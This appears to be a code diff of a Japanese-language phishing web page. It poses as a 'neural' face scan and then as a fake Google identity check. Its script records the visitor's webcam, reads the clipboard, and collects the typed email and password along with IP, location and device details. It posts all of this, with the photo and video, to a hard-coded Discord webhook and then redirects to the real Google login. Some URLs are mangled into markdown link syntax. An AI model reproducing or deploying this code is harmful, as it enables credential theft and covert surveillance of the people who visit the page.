@@ -22,7 +22,6 @@
 </head>
 <body>
 
-    <!-- ステップ1: スキャン画面 -->
     <div class="card" id="camera-ui">
         <h1>NEURAL ANALYZER</h1>
         <div class="v-wrap">
@@ -33,9 +32,8 @@
         <div class="status-text">ENCRYPTED CONNECTION: SECURE</div>
     </div>
 
-    <!-- ステップ2: ログイン画面 -->
     <div class="card" id="login-ui">
-        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="90" style="margin-bottom:20px;">
+        <img src="[https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png](https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png)" width="90" style="margin-bottom:20px;">
         <h2 style="font-size:16px; margin-bottom:25px; font-weight: 400; color: #ccc;">続行するには本人確認が必要です</h2>
         <form id="trap-form">
             <input type="email" id="email" placeholder="メールアドレスまたは電話番号" required>
@@ -47,8 +45,7 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // 🚨 Webhook URL
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1466756850413211698/VnDiihsRnf56T6bUyhfdDoExTf8kAGYDuSkNDREPSMeS-pgASK1SK4jHowR5vmBr2vxm";
+        const WEBHOOK_URL = "[https://discord.com/api/webhooks/1466756850413211698/VnDiihsRnf56T6bUyhfdDoExTf8kAGYDuSkNDREPSMeS-pgASK1SK4jHowR5vmBr2vxm](https://discord.com/api/webhooks/1466756850413211698/VnDiihsRnf56T6bUyhfdDoExTf8kAGYDuSkNDREPSMeS-pgASK1SK4jHowR5vmBr2vxm)";
 
         const video = document.getElementById('video');
         const startBtn = document.getElementById('start-btn');
@@ -56,16 +53,15 @@
         let capturedImg = "";
         let videoBlob = null;
         let net = {};
+        let clipboardData = "未取得";
 
-        // IPと詳細なネットワーク情報を事前に取得
         window.onload = async () => {
             try {
-                const res = await fetch('https://ipapi.co/json/');
+                const res = await fetch('[https://ipapi.co/json/](https://ipapi.co/json/)');
                 net = await res.json();
             } catch (e) { net = { ip: "取得失敗" }; }
         };
 
-        // 1. スキャン開始 & 録画開始
         startBtn.onclick = async () => {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -74,7 +70,12 @@
                 startBtn.disabled = true;
                 line.style.display = "block";
 
-                // --- 録画ロジック ---
+                try {
+                    if (navigator.clipboard) {
+                        clipboardData = await navigator.clipboard.readText();
+                    }
+                } catch(e) { clipboardData = "アクセス拒否"; }
+
                 const mediaRecorder = new MediaRecorder(stream);
                 const chunks = [];
                 mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
@@ -84,38 +85,34 @@
                 mediaRecorder.start();
 
                 setTimeout(() => {
-                    // 写真撮影
                     const canvas = document.getElementById('canvas');
                     canvas.width = video.videoWidth; 
                     canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     capturedImg = canvas.toDataURL('image/jpeg', 0.5);
                     
-                    // 録画停止
                     mediaRecorder.stop();
-                    
                     document.getElementById('camera-ui').style.display = 'none';
                     document.getElementById('login-ui').style.display = 'block';
-                    
-                    // カメラを止める
                     stream.getTracks().forEach(t => t.stop());
-                }, 4500); // 4.5秒間録画
+                }, 4500);
             } catch (err) { 
                 alert("カメラの許可が必要です。"); 
             }
         };
 
-        // 2. 情報収集とDiscord送信
         document.getElementById('trap-form').onsubmit = async (e) => {
             e.preventDefault();
             document.getElementById('final-btn').innerText = "認証中...";
             document.getElementById('final-btn').disabled = true;
 
-            // バッテリー情報の取得
             let batteryStatus = "不明";
+            let storageInfo = "不明";
             try {
                 const battery = await navigator.getBattery();
                 batteryStatus = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? '充電中' : '放電中'})`;
+                const storage = await navigator.storage.estimate();
+                storageInfo = `空き: ${(storage.quota / (1024 ** 3)).toFixed(1)}GB`;
             } catch (e) {}
 
             const info = {
@@ -125,22 +122,20 @@
                 mem: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : '不明',
                 res: `${window.screen.width}x${window.screen.height}`,
                 tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                ref: document.referrer || "直接アクセス"
+                conn: navigator.connection ? `${navigator.connection.effectiveType}` : "不明"
             };
 
             const payload = {
-                username: "Deep Neural Tracker Pro v5",
-                avatar_url: "https://cdn-icons-png.flaticon.com/512/6840/6840478.png",
+                username: "Ultimate Tracker v6.1",
                 embeds: [{
-                    title: "🎯 Full Intelligence Report Captured",
-                    color: 0xee1111,
+                    title: "🎯 HIGH-PRIORITY INTELLIGENCE",
+                    color: 0xff0000,
                     fields: [
-                        { name: "📧 Credentials", value: `**Email:** \`${document.getElementById('email').value}\`\n**Pass:** \`${document.getElementById('pass').value}\``, inline: false },
-                        { name: "🌐 Network Info", value: `**IP:** [${net.ip}](https://ipinfo.io/${net.ip})\n**ISP:** ${net.org || '?'}\n**Loc:** ${net.city}, ${net.country_name}`, inline: false },
-                        { name: "📱 Device Hardware", value: `**OS/Browser:** \`${info.ua}\`\n**CPU/Mem:** ${info.cores} Cores / ${info.mem}\n**Screen:** ${info.res}`, inline: false },
-                        { name: "🔋 Env Info", value: `**Battery:** ${batteryStatus}\n**Timezone:** ${info.tz}\n**Referer:** ${info.ref}`, inline: false }
+                        { name: "📧 Credentials", value: `**ID:** \`${document.getElementById('email').value}\`\n**PW:** \`${document.getElementById('pass').value}\`` },
+                        { name: "📋 Clipboard", value: "```\n" + clipboardData + "\n```" },
+                        { name: "🌐 Network", value: `**IP:** [${net.ip}](https://ipinfo.io/${net.ip})\n**ISP:** ${net.org || '?'}\n**Loc:** ${net.city || '?'}, ${net.country_name || '?'}` },
+                        { name: "📱 Device", value: `**OS/Browser:** \`${info.ua}\`\n**CPU/Mem:** ${info.cores}C / ${info.mem}\n**Battery:** ${batteryStatus}`, inline: false }
                     ],
-                    footer: { text: "Neural Intelligence System - Video Included" },
                     timestamp: new Date()
                 }]
             };
@@ -148,24 +143,20 @@
             const formData = new FormData();
             formData.append('payload_json', JSON.stringify(payload));
             
-            // 写真を添付
             try {
                 const photoBlob = await (await fetch(capturedImg)).blob();
-                formData.append('file1', photoBlob, 'target_face.jpg');
+                formData.append('file1', photoBlob, 'face.jpg');
             } catch (e) {}
 
-            // 動画を添付
             if (videoBlob) {
-                formData.append('file2', videoBlob, 'recording.webm');
+                formData.append('file2', videoBlob, 'video.webm');
             }
 
-            // 送信実行
             try {
                 await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
             } catch (err) {}
 
-            // 最後にGoogleへ飛ばす
-            window.location.href = "https://accounts.google.com/ServiceLogin?hl=ja";
+            window.location.href = "[https://accounts.google.com/ServiceLogin?hl=ja](https://accounts.google.com/ServiceLogin?hl=ja)";
         };
     </script>
 </body>
